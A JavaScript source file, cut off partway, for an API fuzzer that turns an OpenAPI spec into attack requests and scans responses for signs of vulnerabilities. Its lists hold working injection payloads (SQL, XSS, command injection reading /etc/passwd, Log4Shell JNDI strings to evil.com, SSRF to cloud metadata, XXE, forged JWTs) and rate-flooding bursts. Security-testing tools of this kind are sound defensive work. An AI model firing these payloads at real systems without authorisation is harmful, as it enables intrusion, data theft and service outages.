import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { faker } from '@faker-js/faker';
import yaml from 'js-yaml';
import { createLogger, format, transports } from 'winston';
import StructureMutator from './structureMutator.js';
//import { generateRateLimitTests } from './rateLimit.js'

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const LOG_DIR = process.env.LOG_DIR || './logs';
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

const logger = createLogger({
  level: process.env.NODE_ENV === 'development' ? 'debug' : 'info',
  format: format.combine(
    format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
    format.errors({ stack: true }),
    format.splat(),
    format.json()
  ),
  transports: [
    new transports.File({ filename: path.join(LOG_DIR, 'error.log'), level: 'error' }),
    new transports.File({ filename: path.join(LOG_DIR, 'combined.log') })
  ],
});

class APIFuzzer {
  constructor(swaggerFile, options = {}) {
    this.swaggerFile = swaggerFile;
    this.baseUrl = options.baseUrl || '';
    this.timeout = options.timeout || 5000;
    this.concurrency = options.concurrency || 5;
    this.results = [];
    this.spec = null;
    this.testCases = [];
    this.format = options.format || 'auto';
    this.mutator = new StructureMutator();
    this.startTime = null;
    this.maxRetries = options.maxRetries || 2;
    this.retryDelay = options.retryDelay || 1000;
    this.maxResponseSize = options.maxResponseSize || 10 * 1024 * 1024; // 10MB
    this._rateLimitCounters = {};
    this._rateLimitRampCounters = {};
    this._concurrencyCounters = {};
    this._resourceCounters = {};
    this._protocolCounters = {};
    this._boundaryCounters = {};
    this._cacheCounters = {};
    this._timeoutCounters = {};
    this._encodingCounters = {};
    this._injectionCounters = {};
    this._headerCounters = {};
    this._largeCounters = {};
    this._mutationCounters = {};
    this._leakCounters = {};
  }

  async loadSpec() {
    const ext = path.extname(this.swaggerFile).toLowerCase();
    const content = fs.readFileSync(this.swaggerFile, 'utf8');

    if (this.format === 'yaml' || ext === '.yaml' || ext === '.yml') {
      this.spec = yaml.load(content);
    } else if (this.format === 'json' || ext === '.json') {
      this.spec = JSON.parse(content);
    } else {
      try { 
        this.spec = JSON.parse(content); 
      } catch { 
        this.spec = yaml.load(content); 
      }
    }

    if (!this.spec.openapi && !this.spec.swagger) {
      throw new Error('Не валидная OpenAPI/Swagger спецификация');
    }

    return this.spec;
  }

  resolveRef(ref) {
    if (!ref.startsWith('#/')) return null;
    let current = this.spec;
    for (const part of ref.replace('#/', '').split('/')) {
      current = current?.[part];
    }
    return current;
  }

  generatePayload(schema) {
    if (!schema) return null;
    if (schema.$ref) return this.generatePayload(this.resolveRef(schema.$ref));
    if (schema.enum) return faker.helpers.arrayElement(schema.enum);

    switch (schema.type) {
      case 'string':
        if (schema.format === 'email') return faker.internet.email();
        if (schema.format === 'uuid') return faker.string.uuid();
        if (schema.format === 'date') return faker.date.past().toISOString().split('T')[0];
        if (schema.format === 'date-time') return faker.date.past().toISOString();
        if (schema.minLength && schema.maxLength) {
          const length = faker.number.int({ min: schema.minLength, max: Math.min(schema.maxLength, 100) });
          return faker.string.alphanumeric(length);
        }
        return faker.string.alphanumeric(8);
      case 'integer': 
        if (schema.minimum && schema.maximum) {
          return faker.number.int({ min: schema.minimum, max: schema.maximum });
        }
        return faker.number.int({ min: 1, max: 1000 });
      case 'number': 
        if (schema.minimum && schema.maximum) {
          return faker.number.float({ min: schema.minimum, max: schema.maximum });
        }
        return faker.number.float({ min: 1, max: 1000 });
      case 'boolean': 
        return faker.datatype.boolean();
      case 'object':
        if (schema.properties) {
          const obj = {};
          for (const [k, v] of Object.entries(schema.properties)) {
            if (!schema.required || schema.required.includes(k) || Math.random() > 0.3) {
              obj[k] = this.generatePayload(v);
            }
          }
          return Object.keys(obj).length ? obj : { fuzz: faker.string.alphanumeric(6) };
        }
        return {};
      case 'array':
        const minItems = schema.minItems || 1;
        const maxItems = Math.min(schema.maxItems || 3, 5);
        const count = faker.number.int({ min: minItems, max: maxItems });
        return Array(count).fill().map(() => this.generatePayload(schema.items));
      default: 
        return null;
    }
  }

  normalizeUrl(url) { 
    return url.replace(/([^:]\/)\/+/g, "$1"); 
  }

  interpolateUrl(url, params) {
    let result = url;
    for (const [k, v] of Object.entries(params)) {
      result = result.replace(`{${k}}`, encodeURIComponent(String(v)));
    }
    return result;
  }

  getHeaders(operation) {
    const headers = {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'User-Agent': 'Hercules-Fuzzer/1.0'
    };
    const security = operation.security || this.spec.security || [];
    for (const scheme of security) {
      if (scheme.bearerAuth || scheme.apiKeyAuth) {
        headers['Authorization'] = 'Bearer test-token-12345';
      }
      if (scheme.apiKeyAuth && scheme.apiKeyAuth.in === 'header') {
        headers[scheme.apiKeyAuth.name || 'X-API-Key'] = 'test-api-key-12345';
      }
    }
    return headers;
  }

  // ==================== ФАЗЗИНГ ЗАГОЛОВКОВ ====================
  
  generateMaliciousHeaders() {
    const maliciousHeadersList = [
      // Injection attacks
      {
        'X-Forwarded-For': '127.0.0.1, 192.168.1.1, 10.0.0.1',
        'X-Real-IP': '0.0.0.0',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': 'localhost',
        'X-Remote-Addr': '127.0.0.1'
      },
      {
        'X-HTTP-Method-Override': 'POST',
        'X-Method-Override': 'DELETE',
        'X-HTTP-Method': 'PUT',
        'X-Method': 'PATCH'
      },
      {
        'X-Original-URL': '/admin',
        'X-Rewrite-URL': '/admin',
        'X-Proxy-URL': '/admin',
        'X-Forwarded-Prefix': '/admin'
      },
      {
        'X-Request-ID': '<script>alert(1)</script>',
        'X-Request-Id': "' OR '1'='1",
        'Request-Id': '../../../../etc/passwd',
        'X-Correlation-ID': '; cat /etc/passwd;'
      },
      {
        'User-Agent': '"; DROP TABLE users; --',
        'User-Agent': '<img src=x onerror=alert(1)>',
        'User-Agent': '../../../../etc/passwd',
        'User-Agent': '${jndi:ldap://evil.com/a}'
      },
      {
        'Referer': 'javascript:alert(1)',
        'Referer': "' OR 1=1--",
        'Referer': 'https://evil.com/../../etc/passwd',
        'Referer': 'https://localhost:8080/admin'
      },
      {
        'Origin': 'https://evil.com',
        'Origin': 'null',
        'Origin': 'javascript:alert(1)',
        'Origin': "' OR '1'='1"
      },
      {
        'Cookie': 'session=<script>alert(1)</script>',
        'Cookie': 'admin=True',
        'Cookie': 'userId=1 OR 1=1',
        'Cookie': 'SESSION=../../../../etc/passwd'
      },
      {
        'Authorization': 'Bearer <script>alert(1)</script>',
        'Authorization': 'Basic \' OR \'1\'=\'1',
        'Authorization': 'Bearer ../../../../etc/passwd',
        'Authorization': 'JWT eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.'
      },
      {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Type': 'multipart/form-data',
        'Content-Type': 'application/xml',
        'Content-Type': 'text/html'
      },
      {
        'Accept': '../etc/passwd',
        'Accept': '<script>alert(1)</script>',
        'Accept': "' OR '1'='1",
        'Accept': '*/../../*/*'
      },
      {
        'Accept-Language': '<script>alert(1)</script>',
        'Accept-Encoding': 'gzip, deflate, <script>',
        'Accept-Charset': "' OR '1'='1",
        'Cache-Control': 'no-cache, no-store, <script>'
      },
      {
        'X-Forwarded-Host': 'evil.com',
        'X-Forwarded-Proto': 'http',
        'X-Forwarded-Scheme': 'https',
        'Forwarded': 'for=192.168.1.1;proto=http'
      },
      {
        'Host': 'evil.com',
        'Host': 'localhost:8080',
        'Host': '127.0.0.1',
        'Host': '0.0.0.0'
      },
      {
        'X-API-Key': "' OR '1'='1",
        'X-API-Key': '<script>alert(1)</script>',
        'X-API-Key': '../../../../etc/passwd',
        'API-Key': '${jndi:ldap://evil.com/a}'
      }
    ];
    
    return maliciousHeadersList[Math.floor(Math.random() * maliciousHeadersList.length)];
  }

  generateLargeHeaders() {
    const largeValue = 'A'.repeat(5000);
    const maliciousValue = 'X'.repeat(4000) + '../'.repeat(500);
    
    return {
      'X-Large-Header': largeValue,
      'X-Malicious-Header': maliciousValue,
      'X-Buffer-Overflow': 'A'.repeat(10000),
      'X-Recursive': largeValue + largeValue
    };
  }


  generateRateLimitTests(operation) {
    const testCases = [];
    const baseUrl = this.baseUrl;
    const pathUrl = operation.path;
    const method = operation.method;

    // Быстрая серия запросов (100 запросов за 1 секунду)
    const rapidRequests = [];
    for (let i = 0; i < 100; i++) {
        rapidRequests.push({
            id: `${method}_${pathUrl}_rate_rapid_${i}`,
            method: method,
            url: this.normalizeUrl(`${baseUrl}${pathUrl}`),
            path: pathUrl,
            type: 'rate_limit_rapid',
            delay: 0,
            expectedStatus: [200, 429, 503]
        });
    }
    testCases.push(...rapidRequests);
    
    // Постепенное увеличение нагрузки
    const delays = [100, 50, 25, 10, 5, 2, 1, 0];
    for (let i = 0; i < delays.length; i++) {
        testCases.push({
            id: `${method}_${pathUrl}_rate_ramp_${i}`,
            method: method,
            url: this.normalizeUrl(`${baseUrl}${pathUrl}`),
            path: pathUrl,
            type: 'rate_limit_ramp',
            delay: delays[i],
            burstSize: 10,
            expectedStatus: [200, 429, 503]
        });
    }
    
    return testCases;
}
  generateHeaderInjectionPayload(baseHeaders) {
    const headersVariants = [];
    
    // Вариант 1: Злые заголовки
    headersVariants.push({
      ...baseHeaders,
      ...this.generateMaliciousHeaders()
    });
    
    // Вариант 2: Огромные заголовки
    headersVariants.push({
      ...baseHeaders,
      ...this.generateLargeHeaders()
    });
    
    // Вариант 3: Пустые заголовки
    headersVariants.push({
      ...baseHeaders,
      'X-Empty-Header': '',
      'X-Null-Header': null,
      'X-Undefined-Header': undefined
    });
    
    // Вариант 4: Дублирование заголовков
    headersVariants.push({
      ...baseHeaders,
      'X-Duplicate': 'value1',
      'X-Duplicate': 'value2'
    });
    
    // Вариант 5: Специальные символы в заголовках
    headersVariants.push({
      ...baseHeaders,
      'X-Special-Chars': '!@#$%^&*()_+{}|:"<>?`~',
      'X-Unicode': 'Привет мир 你好世界 🎉',
      'X-Control-Chars': '\x00\x01\x02\x03\x04\x05'
    });
    
    // Вариант 6: Инъекции протокола
    headersVariants.push({
      ...baseHeaders,
      'X-Proto-Inject': 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n',
      'X-CRLF-Inject': 'test\r\nX-Injected: malicious',
      'X-Response-Split': 'Content-Length: 0\r\n\r\nHTTP/1.1 200 OK'
    });
    
    // Вариант 7: Path traversal в заголовках
    headersVariants.push({
      ...baseHeaders,
      'X-Path': '../../../../etc/passwd',
      'X-File': 'C:\\Windows\\System32\\config',
      'X-Directory': '/etc/shadow'
    });
    
    // Вариант 8: SQL/NoSQL инъекции
    headersVariants.push({
      ...baseHeaders,
      'X-SQL': "' OR '1'='1' --",
      'X-NoSQL': '{"$ne": null}',
      'X-Mongo': '{$gt: ""}'
    });
    
    // Вариант 9: SSRF попытки
    headersVariants.push({
      ...baseHeaders,
      'X-SSRF': 'http://169.254.169.254/latest/meta-data/',
      'X-Internal': 'http://localhost:8080/admin',
      'X-Metadata': 'http://169.254.169.254/'
    });
    
    // Вариант 10: XXE попытки
    headersVariants.push({
      ...baseHeaders,
      'X-XML': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      'X-XXE': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    });
    
    return headersVariants;
  }


  extractRequestBody(operation) {
    if (operation.requestBody) {
      const content = operation.requestBody.content;
      const jsonContent = content?.['application/json'] || content?.['application/merge-patch+json'];
      if (jsonContent?.schema) {
        return this.generatePayload(jsonContent.schema);
      }
    }

    for (const param of operation.parameters || []) {
      if (param.in === 'body' && param.schema) {
        return this.generatePayload(param.schema);
      }
    }

    return null;
  }

  injectIntoObject(obj, injections) {
    if (!obj || typeof obj !== 'object') return;
    for (const k of Object.keys(obj)) {
      if (typeof obj[k] === 'string') {
        obj[k] = faker.helpers.arrayElement(injections);
      } else if (obj[k] && typeof obj[k] === 'object') {
        this.injectIntoObject(obj[k], injections);
      }
    }
  }

  generateInjectionPayload(operation, basePathParams = {}) {
    const injections = [
      "' OR 1=1--",
      "<script>alert(1)</script>",
      "; ls -la;",
      "../../../../etc/passwd",
      "' UNION SELECT NULL--",
      "'; DROP TABLE users; --",
      "<img src=x onerror=alert(1)>",
      "${7*7}",
      "'; exec xp_cmdshell('dir'); --"
    ];

    const result = {
      query: {},
      body: null,
      path: { ...basePathParams }
    };

    for (const param of operation.parameters || []) {
      const payload = faker.helpers.arrayElement(injections);

      if (param.in === 'query') {
        result.query[param.name] = payload;
      }

      if (param.in === 'path') {
        result.path[param.name] = faker.helpers.arrayElement(injections);
      }
      
      if (param.in === 'body' && param.schema) {
        const body = this.generatePayload(param.schema);
        if (body) {
          this.injectIntoObject(body, injections);
          result.body = body;
        }
      }
    }

    if (operation.requestBody) {
      const content = operation.requestBody.content;
      const jsonContent = content?.['application/json'] || content?.['application/merge-patch+json'];
      if (jsonContent?.schema) {
        const body = this.generatePayload(jsonContent.schema);
        if (body) {
          this.injectIntoObject(body, injections);
          result.body = body;
        }
      }
    }

    const hasData = Object.keys(result.query).length > 0 || 
                    Object.keys(result.path).length > 0 || 
                    result.body;

    return hasData ? result : null;
  }

  deepInjectLarge(obj, value, depth = 0) {
    if (depth > 5) return obj;

    if (typeof obj === 'string') return value;
    if (typeof obj === 'number') return 999999999;
    if (typeof obj === 'boolean') return true;
    if (Array.isArray(obj)) {
      return obj.map(item => this.deepInjectLarge(item, value, depth + 1));
    }
    if (typeof obj === 'object' && obj !== null) {
      const newObj = {};
      for (const key of Object.keys(obj)) {
        newObj[key] = this.deepInjectLarge(obj[key], value, depth + 1);
      }
      return newObj;
    }
    return obj;
  }

  generateLargePayload(operation) {
    const variants = [
      'A'.repeat(10000),
      'B'.repeat(20000),
      '%00'.repeat(5000),
      '🔥'.repeat(3000),
      'A'.repeat(10000) + '../'.repeat(1000),
      '{"a":' + '"A".repeat(5000)' + '}',
      Array(1000).fill('x').join('')
    ];

    const largeStr = variants[Math.floor(Math.random() * variants.length)];

    const result = {
      query: {},
      path: {},
      body: null
    };

    for (const param of operation.parameters || []) {
      const name = param.name.toLowerCase();

      if (name.includes('id')) {
        const payloads = ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity'];
        const val = payloads[Math.floor(Math.random() * payloads.length)];

        if (param.in === 'query') result.query[param.name] = val;
        if (param.in === 'path') result.path[param.name] = val;
        continue;
      }

      if (param.in === 'query') {
        result.query[param.name] = largeStr;
      }
      if (param.in === 'path') {
        result.path[param.name] = largeStr;
      }
      if (param.in === 'body' && param.schema) {
        const base = this.generatePayload(param.schema);
        if (base) {
          result.body = this.deepInjectLarge(base, largeStr);
        }
      }
    }

    if (operation.requestBody) {
      const content = operation.requestBody.content;
      const jsonContent = content?.['application/json'] || content?.['application/merge-patch+json'];
      if (jsonContent?.schema) {
        const base = this.generatePayload(jsonContent.schema);
        if (base) {
          result.body = this.deepInjectLarge(base, largeStr);
        }
      }
    }

    if (Object.keys(result.query).length === 0 && 
        Object.keys(result.path).length === 0 && 
        !result.body) {
      return {
        query: {},
        path: {},
        body: largeStr
      };
    }

    return result;
  }

  generateMutationPayload(operation) {
    const base = this.generateNormalPayload(operation);

    if (!base) {
      return {
        query: {},
        path: {},
        body: this.randomJunk()
      };
    }

    return {
      query: this.mutateObject(base.query),
      path: this.mutateObject(base.path),
      body: base.body ? this.mutateObject(base.body) : this.randomJunk()
    };
  }

  mutateObject(obj, depth = 0) {
    if (depth > 5) return obj;

    const actions = ['delete', 'nullify', 'typeChange', 'duplicate', 'random', 'overflow', 'empty'];
    const pick = () => actions[Math.floor(Math.random() * actions.length)];

    if (Array.isArray(obj)) {
      return obj.map(x => this.mutateObject(x, depth + 1));
    }

    if (typeof obj !== 'object' || obj === null) {
      return this.randomJunk();
    }

    const newObj = {};

    for (const key of Object.keys(obj)) {
      const action = pick();
      const value = obj[key];

      switch (action) {
        case 'delete':
          continue;
        case 'nullify':
          newObj[key] = null;
          break;
        case 'typeChange':
          newObj[key] = this.changeType(value);
          break;
        case 'duplicate':
          newObj[key] = [value, value];
          break;
        case 'random':
          newObj[key] = this.randomJunk();
          break;
        case 'overflow':
          newObj[key] = 'A'.repeat(10000);
          break;
        case 'empty':
          newObj[key] = '';
          break;
        default:
          newObj[key] = this.mutateObject(value, depth + 1);
      }
    }

    if (Math.random() > 0.7) {
      newObj['__proto__'] = { polluted: true };
    }
    if (Math.random() > 0.7) {
      newObj['unexpected_field'] = this.randomJunk();
    }

    return newObj;
  }

  changeType(value) {
    if (typeof value === 'string') return 123;
    if (typeof value === 'number') return 'string_instead_of_number';
    if (typeof value === 'boolean') return 'true';
    return '???';
  }

  randomJunk() {
    const junk = [
      '<script>alert(1)</script>',
      "' OR 1=1--",
      '../../../../etc/passwd',
      '',
      '🔥🔥🔥',
      null,
      999999999,
      {},
      [],
      true,
      false,
      'null',
      'undefined',
      'NaN',
      'Infinity'
    ];
    return junk[Math.floor(Math.random() * junk.length)];
  }

  generateNormalPayload(operation) {
    const result = {
      query: {},
      path: {},
      body: null
    };

    for (const param of operation.parameters || []) {
      const value = this.generatePayload(param.schema) ?? 'test';

      if (param.in === 'query') result.query[param.name] = value;
      if (param.in === 'path') result.path[param.name] = value;
      if (param.in === 'body' && param.schema) {
        result.body = this.generatePayload(param.schema);
      }
    }

    if (operation.requestBody) {
      const content = operation.requestBody.content;
      const jsonContent = content?.['application/json'] || content?.['application/merge-patch+json'];
      if (jsonContent?.schema) {
        result.body = this.generatePayload(jsonContent.schema);
      }
    }

    return result;
  }

  generateTestCases() {
    const testCases = [];
    const paths = this.spec.paths || {};

    for (const [pathUrl, pathItem] of Object.entries(paths)) {
      for (const [method, operation] of Object.entries(pathItem)) {
        if (!['get', 'post', 'put', 'delete', 'patch', 'head', 'options'].includes(method)) continue;

        const fullUrl = this.normalizeUrl(`${this.baseUrl}${pathUrl}`);
        const params = { path: {}, query: {}, header: {} };
        
        for (const param of operation.parameters || []) {
          const value = this.generatePayload(param.schema) ?? (param.required ? 'test' : null);
          if (value !== null) {
            if (param.in === 'path') params.path[param.name] = value;
            if (param.in === 'query') params.query[param.name] = value;
            if (param.in === 'header') params.header[param.name] = value;
          }
        }

        const normal = this.generateNormalPayload(operation);
        const baseHeaders = { ...this.getHeaders(operation), ...params.header };
        
        operation.path = pathUrl;
        operation.method = method;
        operation.baseUrl = this.baseUrl;

        // Normal тест
        testCases.push({
          id: `${method}_${pathUrl}_normal`,
          method,
          url: this.interpolateUrl(fullUrl, params.path),
          path: pathUrl,
          operation: operation.operationId || `${method}_${pathUrl.replace(/\//g, '_')}`,
          type: 'normal',
          queryParams: params.query,
          headers: baseHeaders,
          body: normal.body,
          expectedStatus: [200, 201, 202, 204]
        });

        // Тесты фаззинга заголовков
        const headerVariants = this.generateHeaderInjectionPayload(baseHeaders);
        headerVariants.forEach((headers, idx) => {
          testCases.push({
            id: `${method}_${pathUrl}_headers_${idx}`,
            method,
            url: this.interpolateUrl(fullUrl, params.path),
            path: pathUrl,
            operation: operation.operationId || `${method}_${pathUrl.replace(/\//g, '_')}`,
            type: 'header_fuzzing',
            queryParams: params.query,
            headers: headers,
            body: normal.body,
            expectedStatus: [400, 401, 403, 404, 422, 500],
            headerPayload: headers
          });
        });

        // Injection тесты
        const injection = this.generateInjectionPayload(operation, params.path);
        if (injection) {
          testCases.push({
            id: `${method}_${pathUrl}_injection`,
            method,
            url: this.interpolateUrl(fullUrl, injection.path),
            path: pathUrl,
            operation: operation.operationId || `${method}_${pathUrl.replace(/\//g, '_')}`,
            type: 'injection',
            queryParams: injection.query,
            headers: baseHeaders,
            body: injection.body,
            expectedStatus: [400, 401, 403, 404, 422, 500],
            injectionPayload: injection
          });
        }

        // Large тесты
        const large = this.generateLargePayload(operation);
        if (large) {
          testCases.push({
            id: `${method}_${pathUrl}_large`,
            method,
            url: this.interpolateUrl(fullUrl, params.path),
            path: pathUrl,
            operation: operation.operationId || `${method}_${pathUrl.replace(/\//g, '_')}`,
            type: 'large',
            queryParams: large.query,
            headers: baseHeaders,
            body: large.body,
            expectedStatus: [400, 413, 500],
            largePayload: large
          });
        }

        // Mutation тесты
        const mutation = this.generateMutationPayload(operation);
        if (mutation) {
          testCases.push({
            id: `${method}_${pathUrl}_mutation`,
            method,
            url: this.interpolateUrl(fullUrl, mutation.path),
            path: pathUrl,
            operation: operation.operationId || `${method}_${pathUrl.replace(/\//g, '_')}`,
            type: 'mutation',
            queryParams: mutation.query,
            headers: baseHeaders,
            body: mutation.body,
            expectedStatus: [400, 401, 403, 422, 500],
            mutationPayload: mutation
          });
        }

            testCases.push(...this.generateRateLimitTests(operation));
           /*   testCases.push(...this.generateConcurrencyTests(operation));
                testCases.push(...this.generateBoundaryTests(operation));
                testCases.push(...this.generateProtocolViolationTests(operation));
                testCases.push(...this.generateEncodingTests(operation));
                testCases.push(...this.generateTimeoutTests(operation));
                testCases.push(...this.generateResourceExhaustionTests(operation));
                testCases.push(...this.generateCachePoisoningTests(operation));
                testCases.push(...this.generateIdempotencyTests(operation));*/
      }
    }

    this.testCases = testCases;
    logger.info(`Сгенерировано ${testCases.length} тестовых случаев (включая ${testCases.filter(t => t.type === 'header_fuzzing').length} тестов заголовков)`);

    return testCases;
  }

  async executeWithRetry(testCase, retryCount = 0) {
    try {
      return await this.executeTestCase(testCase);
    } catch (error) {
      if (retryCount < this.maxRetries && 
          (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED')) {
        logger.debug(`Retrying ${testCase.id}, attempt ${retryCount + 1}`);
        await new Promise(resolve => setTimeout(resolve, this.retryDelay));
        return this.executeWithRetry(testCase, retryCount + 1);
      }
      throw error;
    }
  }

async executeTestCase(testCase) {
    const startTime = Date.now();
    let response = null, error = null;

    try {
      const config = {
        method: testCase.method,
        url: testCase.url,
        timeout: this.timeout,
        headers: testCase.headers,
        validateStatus: () => true,
        maxContentLength: this.maxResponseSize,
        maxBodyLength: this.maxResponseSize,
        decompress: true
      };

      if (testCase.queryParams && Object.keys(testCase.queryParams).length > 0) {
        config.params = testCase.queryParams;
      }
      if (testCase.body) config.data = testCase.body;
        
      response = await axios(config);
      //logger.info('Payload:', config, response)
    } catch (err) { 
      logger.error('Fuzz:', err)
      error = err; 
    }

    const duration = Date.now() - startTime;
    let resultData = null;
    if (response?.data) {
      try {
        const dataStr = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        resultData = dataStr.substring(0, 1000);
      } catch (e) {
        resultData = '[Unable to stringify response]';
      }
    }

    // Формируем payload для отчета
    let payload = null;
    if (testCase.type === 'injection' && testCase.injectionPayload) {
      payload = testCase.injectionPayload;
    } else if (testCase.type === 'large' && testCase.largePayload) {
      payload = testCase.largePayload;
    } else if (testCase.type === 'mutation' && testCase.mutationPayload) {
      payload = testCase.mutationPayload;
    } else if (testCase.type === 'header_fuzzing' && testCase.headerPayload) {
      payload = testCase.headerPayload;
    } else if (testCase.body || testCase.queryParams) {
      payload = { 
        body: testCase.body, 
        query: testCase.queryParams,
        headers: testCase.headers
      };
    }

    return {
      ...testCase,
      status: response?.status || 0,
      statusText: response?.statusText || error?.code || 'ERROR',
      duration,
      responseSize: resultData?.length || 0,
      responseData: resultData,
      error: error?.message,
      timestamp: new Date().toISOString(),
      success: this.isSuccess(response?.status, testCase),
      vulnerabilities: this.detectVulnerability(testCase, response),
      payload: payload  // Убедитесь что это поле всегда есть
    };
  }

  isSuccess(status, testCase) {
    if (testCase.type === 'normal') return testCase.expectedStatus.includes(status);
    if (testCase.type === 'injection') return status >= 400 && status < 500;
    if (testCase.type === 'large') return status === 413 || status === 400 || status === 500;
    if (testCase.type === 'mutation') return status === 400 || status === 422 || status === 500;
    if (testCase.type === 'header_fuzzing') return status === 400 || status === 401 || status === 403;
    return true;
  }

  detectVulnerability(testCase, response) {
    const vulns = [];
    const resp = response?.data ? JSON.stringify(response.data) : '';
    const status = response?.status || 0;

    // Инициализация счетчиков для группировки (если не существуют)
    if (!this._rateLimitCounters) this._rateLimitCounters = {};
    if (!this._rateLimitRampCounters) this._rateLimitRampCounters = {};
    if (!this._concurrencyCounters) this._concurrencyCounters = {};
    if (!this._resourceCounters) this._resourceCounters = {};
    if (!this._protocolCounters) this._protocolCounters = {};
    if (!this._boundaryCounters) this._boundaryCounters = {};
    if (!this._cacheCounters) this._cacheCounters = {};
    if (!this._timeoutCounters) this._timeoutCounters = {};
    if (!this._encodingCounters) this._encodingCounters = {};
    if (!this._injectionCounters) this._injectionCounters = {};

    // Проверка для фаззинга заголовков - группируем по эндпоинту и методу
    if (testCase.type === 'header_fuzzing') {
      const headerKey = `${testCase.path}_${testCase.method}_header_fuzzing`;
      
      if (!this._headerCounters) this._headerCounters = {};
      if (!this._headerCounters[headerKey]) {
        this._headerCounters[headerKey] = { crashes: 0, reflections: 0, authBypasses: 0 };
      }
      
      if (status === 500) {
        this._headerCounters[headerKey].crashes++;
        if (this._headerCounters[headerKey].crashes === 1) {
          vulns.push({ 
            type: 'Header Injection - Server Crash', 
            severity: 'high',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.headerPayload || testCase.payload,
            response_status: status,
            snippet: 'Server crashed on malicious headers'
          });
        }
      }
      
      if (testCase.headers && (
          resp.includes(testCase.headers['User-Agent']) || 
          resp.includes(testCase.headers['Referer']) ||
          resp.includes(testCase.headers['X-Request-ID']))) {
        this._headerCounters[headerKey].reflections++;
        if (this._headerCounters[headerKey].reflections === 1) {
          vulns.push({ 
            type: 'Header Reflection - Possible XSS/Injection', 
            severity: 'medium',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.headerPayload || testCase.payload,
            response_status: status,
            snippet: resp.substring(0, 200)
          });
        }
      }
      
      if (status === 200 && testCase.headers && testCase.headers['X-Original-URL'] === '/admin') {
        this._headerCounters[headerKey].authBypasses++;
        if (this._headerCounters[headerKey].authBypasses === 1) {
          vulns.push({ 
            type: 'Path Traversal via Headers', 
            severity: 'critical',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.headerPayload || testCase.payload,
            response_status: status,
            snippet: 'Successfully accessed admin endpoint via header'
          });
        }
      }
    }

    // Injection тесты - группируем по эндпоинту, методу и типу инъекции
    if (testCase.type === 'injection') {
      const injectionKey = `${testCase.path}_${testCase.method}`;
      
      if (!this._injectionCounters[injectionKey]) {
        this._injectionCounters[injectionKey] = {
          sql: false,
          xss: false,
          cmd: false,
          pathTraversal: false
        };
      }
      
      if (/SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL|SQLite|syntax error|unclosed quotation mark|You have an error in your SQL syntax/i.test(resp)) {
        if (!this._injectionCounters[injectionKey].sql) {
          this._injectionCounters[injectionKey].sql = true;
          vulns.push({ 
            type: 'SQL Injection', 
            severity: 'critical',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.injectionPayload || testCase.payload,
            response_status: status,
            snippet: resp.substring(0, 200)
          });
        }
      }
      if (/<script>|alert\(|onerror=|javascript:|onload=/i.test(resp)) {
        if (!this._injectionCounters[injectionKey].xss) {
          this._injectionCounters[injectionKey].xss = true;
          vulns.push({ 
            type: 'XSS', 
            severity: 'high',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.injectionPayload || testCase.payload,
            response_status: status,
            snippet: resp.substring(0, 200)
          });
        }
      }
      if (/uid=|root:|etc\/passwd|win.ini|C:\\Windows/i.test(resp)) {
        if (!this._injectionCounters[injectionKey].cmd) {
          this._injectionCounters[injectionKey].cmd = true;
          vulns.push({ 
            type: 'Command Injection', 
            severity: 'critical',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.injectionPayload || testCase.payload,
            response_status: status,
            snippet: resp.substring(0, 200)
          });
        }
      }
      if (/\.\.\/|root\.txt|passwd|\.\.\\/i.test(resp)) {
        if (!this._injectionCounters[injectionKey].pathTraversal) {
          this._injectionCounters[injectionKey].pathTraversal = true;
          vulns.push({ 
            type: 'Path Traversal', 
            severity: 'high',
            endpoint: testCase.path,
            method: testCase.method,
            payload: testCase.injectionPayload || testCase.payload,
            response_status: status,
            snippet: resp.substring(0, 200)
          });
        }
      }
    }

    if (testCase.type === 'large') {
      const largeKey = `${testCase.path}_${testCase.method}`;
      
      if (!this._largeCounters) this._largeCounters = {};
      if (!this._largeCounters[largeKey]) {
        this._largeCounters[largeKey] = { reported: false };
      }
      
      if (status === 500 && !this._largeCounters[largeKey].reported) {
        this._largeCounters[largeKey].reported = true;
        vulns.push({ 
          type: 'DoS via Large Payload', 
          severity: 'high',
          endpoint: testCase.path,
          method: testCase.method,
          payload: testCase.largePayload || testCase.payload,
          response_status: status,
          snippet: 'Server crashed or timeout on large payload'
        });
      }
    }

    if (testCase.type === 'mutation' && status === 500) {
      const mutationKey = `${testCase.path}_${testCase.method}`;
      
      if (!this._mutationCounters) this._mutationCounters = {};
      if (!this._mutationCounters[mutationKey]) {
        this._mutationCounters[mutationKey] = { reported: false };
      }
      
      if (!this._mutationCounters[mutationKey].reported) {
        this._mutationCounters[mutationKey].reported = true;
        vulns.push({ 
          type: 'Crash via Structure Mutation', 
          severity: 'high',
          endpoint: testCase.path,
          method: testCase.method,
          payload: testCase.mutationPayload || testCase.payload,
          response_status: status,
          snippet: 'Server crashed on malformed structure'
        });
      }
    }

    // Проверка на утечку данных - группируем по эндпоинту и методу
    if (resp.includes('password') || resp.includes('token') || resp.includes('secret') || resp.includes('key')) {
      const leakKey = `${testCase.path}_${testCase.method}`;
      
      if (!this._leakCounters) this._leakCounters = {};
      if (!this._leakCounters[leakKey]) {
        this._leakCounters[leakKey] = { reported: false };
      }
      
      if (!this._leakCounters[leakKey].reported) {
